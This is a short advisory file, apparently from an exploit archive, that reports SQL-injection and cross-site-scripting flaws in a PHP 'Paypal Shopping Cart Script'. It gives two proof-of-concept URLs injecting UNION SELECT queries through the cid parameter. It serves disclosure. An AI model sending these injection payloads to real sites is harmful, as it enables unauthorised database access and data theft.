@@ -1,0 +1,9 @@
+source: http://www.securityfocus.com/bid/43471/info
+ 
+Paypal Shopping Cart Script is prone to an SQL-injection vulnerability and multiple cross-site scripting vulnerabilities because it fails to sufficiently sanitize user-supplied data.
+ 
+Exploiting these issues could allow an attacker to steal cookie-based authentication credentials, compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.
+ 
+http://www.example.com/paypalshopping/index.php?cid=7%20union%20all%20select%201,2,3,version(),5,6,7--
+
+http://www.example.com/paypalshopping/index.php?cid=1%20AND%201=null+union+select+1,2,3,version(),5,6,7--
